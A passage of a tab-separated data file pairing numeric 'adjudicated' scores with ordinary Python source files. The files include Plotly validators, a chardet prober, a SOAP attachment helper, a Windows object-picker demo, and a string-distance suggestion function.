ConfigEventType.add<<NEWL>>        elif type is CallbackType.POST_REMOVE:<<NEWL>>            kind = ConfigEventType.remove<<NEWL>>        else:<<NEWL>>            kind = ConfigEventType.update<<NEWL>><<NEWL>>        if isinstance(data, Message):<<NEWL>>            msg = dumps(MessageToDict(data, True, True))<<NEWL>>        else:<<NEWL>>            msg = data<<NEWL>><<NEWL>>        event = ConfigEvent(<<NEWL>>            type=kind,<<NEWL>>            hash=hash,<<NEWL>>            data=msg<<NEWL>>        )<<NEWL>><<NEWL>>        self._event_bus_client.publish(self._topic, event)<<NEWL>>"
479	adjudicated	3	"# A demo for the IDsObjectPicker interface.<<NEWL>>import win32clipboard<<NEWL>>import pythoncom<<NEWL>>from win32com.adsi import adsi<<NEWL>>from win32com.adsi.adsicon import *<<NEWL>><<NEWL>>cf_objectpicker = win32clipboard.RegisterClipboardFormat(CFSTR_DSOP_DS_SELECTION_LIST)<<NEWL>><<NEWL>><<NEWL>>def main():<<NEWL>>    hwnd = 0<<NEWL>><<NEWL>>    # Create an instance of the object picker.<<NEWL>>    picker = pythoncom.CoCreateInstance(<<NEWL>>        adsi.CLSID_DsObjectPicker,<<NEWL>>        None,<<NEWL>>        pythoncom.CLSCTX_INPROC_SERVER,<<NEWL>>        adsi.IID_IDsObjectPicker,<<NEWL>>    )<<NEWL>><<NEWL>>    # Create our scope init info.<<NEWL>>    siis = adsi.DSOP_SCOPE_INIT_INFOs(1)<<NEWL>>    sii = siis[0]<<NEWL>><<NEWL>>    # Combine multiple scope types in a single array entry.<<NEWL>><<NEWL>>    sii.type = (<<NEWL>>        DSOP_SCOPE_TYPE_UPLEVEL_JOINED_DOMAIN | DSOP_SCOPE_TYPE_DOWNLEVEL_JOINED_DOMAIN<<NEWL>>    )<<NEWL>><<NEWL>>    # Set uplevel and downlevel filters to include only computer objects.<<NEWL>>    # Uplevel filters apply to both mixed and native modes.<<NEWL>>    # Notice that the uplevel and downlevel flags are different.<<NEWL>><<NEWL>>    sii.filterFlags.uplevel.bothModes = DSOP_FILTER_COMPUTERS<<NEWL>>    sii.filterFlags.downlevel = DSOP_DOWNLEVEL_FILTER_COMPUTERS<<NEWL>><<NEWL>>    # Initialize the interface.<<NEWL>>    picker.Initialize(<<NEWL>>        None,  # Target is the local computer.<<NEWL>>        siis,  # scope infos<<NEWL>>        DSOP_FLAG_MULTISELECT,  # options<<NEWL>>        (""objectGUID"", ""displayName""),<<NEWL>>    )  # attributes to fetch<<NEWL>><<NEWL>>    do = picker.InvokeDialog(hwnd)<<NEWL>>    # Extract the data from the IDataObject.<<NEWL>>    format_etc = (<<NEWL>>        cf_objectpicker,<<NEWL>>        None,<<NEWL>>        pythoncom.DVASPECT_CONTENT,<<NEWL>>        -1,<<NEWL>>        pythoncom.TYMED_HGLOBAL,<<NEWL>>    )<<NEWL>>    medium = do.GetData(format_etc)<<NEWL>>    data = adsi.StringAsDS_SELECTION_LIST(medium.data)<<NEWL>>    for item in data:<<NEWL>>        name, klass, adspath, upn, attrs, flags = item<<NEWL>>        print(""Item"", name)<<NEWL>>        print("" Class:"", klass)<<NEWL>>        print("" AdsPath:"", adspath)<<NEWL>>        print("" UPN:"", upn)<<NEWL>>        print("" Attrs:"", attrs)<<NEWL>>        print("" Flags:"", flags)<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    main()"
469	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""hoverlabel"", parent_name=""choroplethmapbox"", **kwargs<<NEWL>>    ):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
438	adjudicated	0	import time<<NEWL>><<NEWL>>from jet_bridge_base.settings import set_settings<<NEWL>><<NEWL>><<NEWL>>class Configuration(object):<<NEWL>><<NEWL>>    def __init__(self):<<NEWL>>        self.init_time = time.time()<<NEWL>><<NEWL>>    def get_type(self):<<NEWL>>        pass<<NEWL>><<NEWL>>    def get_version(self):<<NEWL>>        pass<<NEWL>><<NEWL>>    def get_model_description(self, db_table):<<NEWL>>        pass<<NEWL>><<NEWL>>    def get_hidden_model_description(self):<<NEWL>>        return []<<NEWL>><<NEWL>>    def get_settings(self):<<NEWL>>        pass<<NEWL>><<NEWL>>    def on_model_pre_create(self, model, pk):<<NEWL>>        pass<<NEWL>><<NEWL>>    def on_model_post_create(self, model, instance):<<NEWL>>        pass<<NEWL>><<NEWL>>    def on_model_pre_update(self, model, instance):<<NEWL>>        pass<<NEWL>><<NEWL>>    def on_model_post_update(self, model, instance):<<NEWL>>        pass<<NEWL>><<NEWL>>    def on_model_pre_delete(self, model, instance):<<NEWL>>        pass<<NEWL>><<NEWL>>    def on_model_post_delete(self, model, instance):<<NEWL>>        pass<<NEWL>><<NEWL>>    def media_get_available_name(self, path):<<NEWL>>        pass<<NEWL>><<NEWL>>    def media_exists(self, path):<<NEWL>>        pass<<NEWL>><<NEWL>>    def media_listdir(self, path):<<NEWL>>        pass<<NEWL>><<NEWL>>    def media_get_modified_time(self, path):<<NEWL>>        pass<<NEWL>><<NEWL>>    def media_open(self, path, mode='rb'):<<NEWL>>        pass<<NEWL>><<NEWL>>    def media_save(self, path, content):<<NEWL>>        pass<<NEWL>><<NEWL>>    def media_delete(self, path):<<NEWL>>        pass<<NEWL>><<NEWL>>    def media_url(self, path, request):<<NEWL>>        pass<<NEWL>><<NEWL>>    def session_set(self, request, name, value, secure=True):<<NEWL>>        pass<<NEWL>><<NEWL>>    def session_get(self, request, name, default=None, decode=True, secure=True):<<NEWL>>        pass<<NEWL>><<NEWL>>    def session_clear(self, request, name):<<NEWL>>        pass<<NEWL>><<NEWL>>    def clean_sso_application_name(self, name):<<NEWL>>        return name.lower().replace('-', '')<<NEWL>><<NEWL>>    def clean_sso_applications(self, applications):<<NEWL>>        return dict(map(lambda x: (self.clean_sso_application_name(x[0]), x[1]), applications.items()))<<NEWL>><<NEWL>><<NEWL>>configuration = Configuration()<<NEWL>><<NEWL>><<NEWL>>def set_configuration(new_configuration):<<NEWL>>    global configuration<<NEWL>>    configuration = new_configuration<<NEWL>>    set_settings(configuration.get_settings())
236	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""scattersmith.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
376	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""scattersmith.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
267	adjudicated	2	"""""""Basic implementation to support SOAP-Attachments<<NEWL>><<NEWL>>See https://www.w3.org/TR/SOAP-attachments<<NEWL>><<NEWL>>""""""<<NEWL>><<NEWL>>import base64<<NEWL>><<NEWL>>from cached_property import cached_property<<NEWL>>from requests.structures import CaseInsensitiveDict<<NEWL>><<NEWL>><<NEWL>>class MessagePack:<<NEWL>>    def __init__(self, parts):<<NEWL>>        self._parts = parts<<NEWL>><<NEWL>>    def __repr__(self):<<NEWL>>        return ""<MessagePack(attachments=[%s])>"" % (<<NEWL>>            "", "".join(repr(a) for a in self.attachments)<<NEWL>>        )<<NEWL>><<NEWL>>    @property<<NEWL>>    def root(self):<<NEWL>>        return self._root<<NEWL>><<NEWL>>    def _set_root(self, root):<<NEWL>>        self._root = root<<NEWL>><<NEWL>>    @cached_property<<NEWL>>    def attachments(self):<<NEWL>>        """"""Return a list of attachments.<<NEWL>><<NEWL>>        :rtype: list of Attachment<<NEWL>><<NEWL>>        """"""<<NEWL>>        return [Attachment(part) for part in self._parts]<<NEWL>><<NEWL>>    def get_by_content_id(self, content_id):<<NEWL>>        """"""get_by_content_id<<NEWL>><<NEWL>>        :param content_id: The content-id to return<<NEWL>>        :type content_id: str<<NEWL>>        :rtype: Attachment<<NEWL>><<NEWL>>        """"""<<NEWL>>        for attachment in self.attachments:<<NEWL>>            if attachment.content_id == content_id:<<NEWL>>                return attachment<<NEWL>><<NEWL>><<NEWL>>class Attachment:<<NEWL>>    def __init__(self, part):<<NEWL>>        encoding = part.encoding or ""utf-8""<<NEWL>>        self.headers = CaseInsensitiveDict(<<NEWL>>            {k.decode(encoding): v.decode(encoding) for k, v in part.headers.items()}<<NEWL>>        )<<NEWL>>        self.content_type = self.headers.get(""Content-Type"", None)<<NEWL>>        self.content_id = self.headers.get(""Content-ID"", None)<<NEWL>>        self.content_location = self.headers.get(""Content-Location"", None)<<NEWL>>        self._part = part<<NEWL>><<NEWL>>    def __repr__(self):<<NEWL>>        return ""<Attachment(%r, %r)>"" % (self.content_id, self.content_type)<<NEWL>><<NEWL>>    @cached_property<<NEWL>>    def content(self):<<NEWL>>        """"""Return the content of the attachment<<NEWL>><<NEWL>>        :rtype: bytes or str<<NEWL>><<NEWL>>        """"""<<NEWL>>        encoding = self.headers.get(""Content-Transfer-Encoding"", None)<<NEWL>>        content = self._part.content<<NEWL>><<NEWL>>        if encoding == ""base64"":<<NEWL>>            return base64.b64decode(content)<<NEWL>>        elif encoding == ""binary"":<<NEWL>>            return content.strip(b""\r\n"")<<NEWL>>        else:<<NEWL>>            return content"
327	adjudicated	1	"######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is mozilla.org code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 1998<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .chardistribution import EUCKRDistributionAnalysis<<NEWL>>from .codingstatemachine import CodingStateMachine<<NEWL>>from .mbcharsetprober import MultiByteCharSetProber<<NEWL>>from .mbcssm import CP949_SM_MODEL<<NEWL>><<NEWL>><<NEWL>>class CP949Prober(MultiByteCharSetProber):<<NEWL>>    def __init__(self) -> None:<<NEWL>>        super().__init__()<<NEWL>>        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)<<NEWL>>        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be<<NEWL>>        #       not different.<<NEWL>>        self.distribution_analyzer = EUCKRDistributionAnalysis()<<NEWL>>        self.reset()<<NEWL>><<NEWL>>    @property<<NEWL>>    def charset_name(self) -> str:<<NEWL>>        return ""CP949""<<NEWL>><<NEWL>>    @property<<NEWL>>    def language(self) -> str:<<NEWL>>        return ""Korean"""
294	adjudicated	2	"# Copyright 2021 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import os<<NEWL>><<NEWL>>from google.cloud import workflows_v1beta<<NEWL>><<NEWL>>import main<<NEWL>><<NEWL>>PROJECT = os.environ[""GOOGLE_CLOUD_PROJECT""]<<NEWL>>LOCATION = ""us-central1""<<NEWL>>WORKFLOW_ID = ""myFirstWorkflow""<<NEWL>><<NEWL>><<NEWL>>def test_workflow_execution():<<NEWL>>    assert PROJECT != """"<<NEWL>><<NEWL>>    if not workflow_exists():<<NEWL>>        workflow_file = open(""myFirstWorkflow.workflows.yaml"", ""r"").read()<<NEWL>><<NEWL>>        workflows_client = workflows_v1beta.WorkflowsClient()<<NEWL>>        workflows_client.create_workflow(request={<<NEWL>>            # Manually construct the location<<NEWL>>            # https://github.com/googleapis/python-workflows/issues/21<<NEWL>>            ""parent"": f'projects/{PROJECT}/locations/{LOCATION}',<<NEWL>>            ""workflow_id"": WORKFLOW_ID,<<NEWL>>            ""workflow"": {<<NEWL>>                ""name"": WORKFLOW_ID,<<NEWL>>                ""source_contents"": workflow_file<<NEWL>>            }<<NEWL>>        })<<NEWL>><<NEWL>>    result = main.execute_workflow(PROJECT)<<NEWL>>    assert len(result) > 0<<NEWL>><<NEWL>><<NEWL>>def workflow_exists():<<NEWL>>    """"""Returns True if the workflow exists in this project<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        workflows_client = workflows_v1beta.WorkflowsClient()<<NEWL>>        workflow_name = workflows_client.workflow_path(PROJECT, LOCATION, WORKFLOW_ID)<<NEWL>>        workflows_client.get_workflow(request={""name"": workflow_name})<<NEWL>>        return True<<NEWL>>    except Exception as e:<<NEWL>>        print(f""Workflow doesn't exist: {e}"")<<NEWL>>        return False"
105	adjudicated	0	"# coding: utf-8<<NEWL>><<NEWL>>if False:  # MYPY<<NEWL>>    from typing import Dict, Any  # NOQA<<NEWL>><<NEWL>>_package_data = dict(<<NEWL>>    full_package_name='ruamel.yaml',<<NEWL>>    version_info=(0, 17, 21),<<NEWL>>    __version__='0.17.21',<<NEWL>>    version_timestamp='2022-02-12 09:49:22',<<NEWL>>    author='Anthon van der Neut',<<NEWL>>    author_email='a.van.der.neut@ruamel.eu',<<NEWL>>    description='ruamel.yaml is a YAML parser/emitter that supports roundtrip preservation of comments, seq/map flow style, and map key order',  # NOQA<<NEWL>>    entry_points=None,<<NEWL>>    since=2014,<<NEWL>>    extras_require={<<NEWL>>        ':platform_python_implementation==""CPython"" and python_version<""3.11""': ['ruamel.yaml.clib>=0.2.6'],  # NOQA<<NEWL>>        'jinja2': ['ruamel.yaml.jinja2>=0.2'],<<NEWL>>        'docs': ['ryd'],<<NEWL>>    },<<NEWL>>    classifiers=[<<NEWL>>        'Programming Language :: Python :: 3 :: Only',<<NEWL>>        'Programming Language :: Python :: 3.5',<<NEWL>>        'Programming Language :: Python :: 3.6',<<NEWL>>        'Programming Language :: Python :: 3.7',<<NEWL>>        'Programming Language :: Python :: 3.8',<<NEWL>>        'Programming Language :: Python :: 3.9',<<NEWL>>        'Programming Language :: Python :: 3.10',<<NEWL>>        'Programming Language :: Python :: Implementation :: CPython',<<NEWL>>        'Topic :: Software Development :: Libraries :: Python Modules',<<NEWL>>        'Topic :: Text Processing :: Markup',<<NEWL>>        'Typing :: Typed',<<NEWL>>    ],<<NEWL>>    keywords='yaml 1.2 parser round-trip preserve quotes order config',<<NEWL>>    read_the_docs='yaml',<<NEWL>>    supported=[(3, 5)],  # minimum<<NEWL>>    tox=dict(<<NEWL>>        env='*f',  # f for 3.5<<NEWL>>        fl8excl='_test/lib',<<NEWL>>    ),<<NEWL>>    # universal=True,<<NEWL>>    python_requires='>=3',<<NEWL>>    rtfd='yaml',<<NEWL>>)  # type: Dict[Any, Any]<<NEWL>><<NEWL>><<NEWL>>version_info = _package_data['version_info']<<NEWL>>__version__ = _package_data['__version__']<<NEWL>><<NEWL>>try:<<NEWL>>    from .cyaml import *  # NOQA<<NEWL>><<NEWL>>    __with_libyaml__ = True<<NEWL>>except (ImportError, ValueError):  # for Jython<<NEWL>>    __with_libyaml__ = False<<NEWL>><<NEWL>>from ruamel.yaml.main import *  # NOQA"
45	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class DomainValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""domain"", parent_name=""layout.geo"", **kwargs):<<NEWL>>        super(DomainValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Domain""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            column<<NEWL>>                If there is a layout grid, use the domain for<<NEWL>>                this column in the grid for this geo subplot .<<NEWL>>                Note that geo subplots are constrained by<<NEWL>>                domain. In general, when `projection.scale` is<<NEWL>>                set to 1. a map will fit either its x or y<<NEWL>>                domain, but not both.<<NEWL>>            row<<NEWL>>                If there is a layout grid, use the domain for<<NEWL>>                this row in the grid for this geo subplot .<<NEWL>>                Note that geo subplots are constrained by<<NEWL>>                domain. In general, when `projection.scale` is<<NEWL>>                set to 1. a map will fit either its x or y<<NEWL>>                domain, but not both.<<NEWL>>            x<<NEWL>>                Sets the horizontal domain of this geo subplot<<NEWL>>                (in plot fraction). Note that geo subplots are<<NEWL>>                constrained by domain. In general, when<<NEWL>>                `projection.scale` is set to 1. a map will fit<<NEWL>>                either its x or y domain, but not both.<<NEWL>>            y<<NEWL>>                Sets the vertical domain of this geo subplot<<NEWL>>                (in plot fraction). Note that geo subplots are<<NEWL>>                constrained by domain. In general, when<<NEWL>>                `projection.scale` is set to 1. a map will fit<<NEWL>>                either its x or y domain, but not both.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
154	adjudicated	0	"from ZenMaster import ZenMaster<<NEWL>>from ZenConfig import ZenConfig<<NEWL>>from Common.CEnum import AUTYPE, DATA_SRC, KL_TYPE<<NEWL>>from Plot.AnimatePlotDriver import AnimateDriver<<NEWL>>from Plot.PlotDriver import PlotDriver<<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    code = ""sz.000001""<<NEWL>>    begin_time = ""2018-01-01""<<NEWL>>    end_time = None<<NEWL>>    data_src = DATA_SRC.BAO_STOCK<<NEWL>>    lv_list = [KL_TYPE.K_DAY]<<NEWL>><<NEWL>>    config = ZenConfig({<<NEWL>>        ""bi_strict"": True,<<NEWL>>        ""triger_step"": False,<<NEWL>>        ""skip_step"": 0,<<NEWL>>        ""divergence_rate"": float(""inf""),<<NEWL>>        ""bsp2_follow_1"": False,<<NEWL>>        ""bsp3_follow_1"": False,<<NEWL>>        ""min_zs_cnt"": 0,<<NEWL>>        ""bs1_peak"": False,<<NEWL>>        ""macd_algo"": ""peak"",<<NEWL>>        ""bs_type"": '1,2,3a,1p,2s,3b',<<NEWL>>        ""print_warming"": True,<<NEWL>>    })<<NEWL>><<NEWL>>    plot_config = {<<NEWL>>        ""plot_kline"": True,<<NEWL>>        ""plot_kline_combine"": True,<<NEWL>>        ""plot_bi"": True,<<NEWL>>        ""plot_seg"": True,<<NEWL>>        ""plot_eigen"": False,<<NEWL>>        ""plot_zs"": True,<<NEWL>>        ""plot_macd"": False,<<NEWL>>        ""plot_mean"": False,<<NEWL>>        ""plot_channel"": False,<<NEWL>>        ""plot_bsp"": True,<<NEWL>>        ""plot_extrainfo"": False,<<NEWL>>    }<<NEWL>><<NEWL>>    plot_para = {<<NEWL>>        ""seg"": {<<NEWL>>        },<<NEWL>>        ""bi"": {<<NEWL>>            # ""show_num"": True,<<NEWL>>            # ""disp_end"": True,<<NEWL>>        },<<NEWL>>        ""figure"": {<<NEWL>>            ""x_range"": 50,<<NEWL>>        },<<NEWL>>    }<<NEWL>>    chan = ZenMaster(<<NEWL>>        code=code,<<NEWL>>        begin_time=begin_time,<<NEWL>>        end_time=end_time,<<NEWL>>        data_src=data_src,<<NEWL>>        lv_list=lv_list,<<NEWL>>        config=config,<<NEWL>>        autype=AUTYPE.QFQ,<<NEWL>>    )<<NEWL>><<NEWL>>    if not config.triger_step:<<NEWL>>        plot_driver = PlotDriver(<<NEWL>>            chan,<<NEWL>>            plot_config=plot_config,<<NEWL>>            plot_para=plot_para,<<NEWL>>        )<<NEWL>>        plot_driver.figure.show()<<NEWL>>    else:<<NEWL>>        AnimateDriver(<<NEWL>>            chan,<<NEWL>>            plot_config=plot_config,<<NEWL>>            plot_para=plot_para,<<NEWL>>        )"
385	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""histogram2dcontour.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
14	adjudicated	3	"from collections import OrderedDict<<NEWL>><<NEWL>><<NEWL>>def suggestion_list(inp, options):<<NEWL>>    """"""<<NEWL>>     Given an invalid input string and a list of valid options, returns a filtered<<NEWL>>     list of valid options sorted based on their similarity with the input.<<NEWL>>    """"""<<NEWL>>    options_by_distance = OrderedDict()<<NEWL>>    input_threshold = len(inp) / 2<<NEWL>><<NEWL>>    for option in options:<<NEWL>>        distance = lexical_distance(inp, option)<<NEWL>>        threshold = max(input_threshold, len(option) / 2, 1)<<NEWL>>        if distance <= threshold:<<NEWL>>            options_by_distance[option] = distance<<NEWL>><<NEWL>>    return sorted(<<NEWL>>        list(options_by_distance.keys()), key=lambda k: options_by_distance[k]<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def lexical_distance(a, b):<<NEWL>>    """"""<<NEWL>>     Computes the lexical distance between strings A and B.<<NEWL>>     The ""distance"" between two strings is given by counting the minimum number<<NEWL>>     of edits needed to transform string A into string B. An edit can be an<<NEWL>>     insertion, deletion, or substitution of a single character, or a swap of two<<NEWL>>     adjacent characters.<<NEWL>>     This distance can be useful for detecting typos in input or sorting<<NEWL>>     @returns distance in number of edits<<NEWL>>    """"""<<NEWL>><<NEWL>>    d = [[i] for i in range(len(a) + 1)] or []<<NEWL>>    d_len = len(d) or 1<<NEWL>>    for i in range(d_len):<<NEWL>>        for j in range(1, len(b) + 1):<<NEWL>>            if i == 0:<<NEWL>>                d[i].append(j)<<NEWL>>            else:<<NEWL>>                d[i].append(0)<<NEWL>><<NEWL>>    for i in range(1, len(a) + 1):<<NEWL>>        for j in range(1, len(b) + 1):<<NEWL>>            cost = 0 if a[i - 1] == b[j - 1] else 1<<NEWL>><<NEWL>>            d[i][j] = min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + cost)<<NEWL>><<NEWL>>            if i > 1 and j < 1 and a[i - 1] == b[j - 2] and a[i - 2] == b[j - 1]:<<NEWL>>                d[i][j] = min(d[i][j], d[i - 2][j - 2] + cost)<<NEWL>><<NEWL>>    return d[len(a)][len(b)]"
